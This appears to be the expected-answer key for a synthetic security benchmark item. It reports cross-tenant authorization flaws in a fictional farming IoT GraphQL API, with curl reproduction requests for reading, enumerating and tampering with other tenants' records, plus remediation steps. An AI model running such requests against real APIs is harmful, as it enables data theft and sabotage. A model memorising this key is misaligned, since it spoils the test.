# Expected Response

## System
- System: HarvestIQ IoT Platform v1.1.2
- Domain: AGRICULTURE / PRECISION FARMING
- Example ID: GQL-0422
- Risk ID: RISK-GQL-422

## Findings

### 1. Pattern 1.5 — Client-Controlled `tenantId` in `listResources` Bypasses Multi-Tenant Isolation (Primary Pattern)

The `listResources` resolver accepts a client-supplied `tenantId` filter argument and trusts it instead of extracting `tenantId` from the JWT. An attacker authenticated as `tenant-b1a1` can pass `tenantId: "tenant-ee03"` to enumerate all precision farming records for another tenant.

```bash
# Enumerate all cross-tenant IoT/farming resources (no owner check)
curl -s -X POST https://api.harvestiq-iot-platfo.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-B1A1>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-b1a1" \
  -d '{"query": "query { listResources(tenantId: \"tenant-ee03\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```

**Vulnerable outcome:** Returns all records with `tenantId: "tenant-ee03"` — full cross-tenant precision farming data exposed.

### 2. Bulk Cross-Tenant IoT Resource Enumeration — `bulkResourceLookup` (HAR Primary)

HAR capture shows `bulkResourceLookup` mutation from `tenant-b1a1` successfully returning data belonging to `tenant-ee03` (response contains `getResource` wrapper — synthetic artifact of the test harness; the cross-tenant `tenantId` mismatch in the response confirms the authorization bypass).

```bash
curl -s -X POST https://api.harvestiq-iot-platfo.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-B1A1>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-b1a1" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2422\", \"R-1422\", \"R-3422\"]) { resourceId tenantId ownerId data { sensitiveField internalNotes auditLog { ... on AuditEntry { action } } } } }"}'
```

**Vulnerable outcome:** Returns objects across tenants including `tenantId: "tenant-ee03"` records with `sensitiveField: "CONFIDENTIAL-b1a1ee03"` and `internalNotes`.

### 3. Single-ID Cross-Tenant Read — `getResource` (RISK-GQL-422)

```bash
curl -s -X POST https://api.harvestiq-iot-platfo.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-B1A1>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-b1a1" \
  -d '{"query": "query { getResource(id: \"R-2422\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```

**Vulnerable outcome:** Returns `tenantId: "tenant-ee03"` record — BOLA confirmed (RISK-GQL-422).

### 4. Cross-Tenant IoT Record Mutation — `updateResource`

```bash
curl -s -X POST https://api.harvestiq-iot-platfo.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-B1A1>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-b1a1" \
  -d '{"query": "mutation { updateResource(id: \"R-2422\", input: {status: \"tampered\", ownerId: \"attacker-b1a1ee03\"}) { resourceId tenantId status ownerId } }"}'
```

**Vulnerable outcome:** Precision farming record of `tenant-ee03` modified — crop/yield data corruption, regulatory traceability sabotage (EU Regulation 178/2002).

### 5. Redis Cache IoT Data Leak

Cache key is `resourceId` only (no `tenantId`). An attacker can prime the cache with a cross-tenant resource ID; subsequent legitimate tenant requests receive the attacker-poisoned cache entry, or the attacker can read another tenant's precision farming data cached from a prior request.

## Reproduction

**Step 1 — Baseline:**
```bash
curl -s -X POST https://api.harvestiq-iot-platfo.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-B1A1>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-b1a1" \
  -d '{"query": "query { getResource(id: \"R-1422\") { resourceId tenantId ownerId data { sensitiveField } } }"}'
```
**Expected:** Returns `tenantId: "tenant-b1a1"` — attacker's own object.

**Step 2 — Pattern 1.5: list all cross-tenant records via client-supplied `tenantId` filter (primary pattern attack):**
```bash
curl -s -X POST https://api.harvestiq-iot-platfo.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-B1A1>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-b1a1" \
  -d '{"query": "query { listResources(tenantId: \"tenant-ee03\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Full cross-tenant enumeration of `tenant-ee03` precision farming data.

**Step 3 — Bulk cross-tenant IoT resource enumeration (primary HAR attack):**
```bash
curl -s -X POST https://api.harvestiq-iot-platfo.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-B1A1>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-b1a1" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2422\", \"R-1422\", \"R-3422\"]) { resourceId tenantId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns `sensitiveField: "CONFIDENTIAL-b1a1ee03"` for `tenant-ee03` objects.

**Step 4 — Single-ID cross-tenant read (RISK-GQL-422):**
```bash
curl -s -X POST https://api.harvestiq-iot-platfo.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-B1A1>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-b1a1" \
  -d '{"query": "query { getResource(id: \"R-2422\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** `tenantId: "tenant-ee03"` with `sensitiveField` and `internalNotes` — BOLA confirmed.

## Secure Outcome Verification
For Steps 2–4, the secure implementation MUST return:
```json
{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": null }
```

## Remediation
- `listResources` fix: server must inject `WHERE tenant_id = $jwtTenantId` regardless of client-supplied `tenantId` argument (Pattern 1.5, primary fix).
- Resolver-level tenant check: `WHERE resourceId = $id AND tenant_id = $jwtTenantId` in `getResource`, `updateResource`, `deleteResource` (RISK-GQL-422).
- Per-ID ownership filter in `bulkResourceLookup`: post-fetch filter returning only `tenantId === jwtTenantId` items.
- Fix Redis cache key: include `tenantId` (e.g., `resource:{tenantId}:{resourceId}`).
- Automated regression test: authenticate as `tenant-b1a1`, request `tenant-ee03` data — assert HTTP 403 or null data.
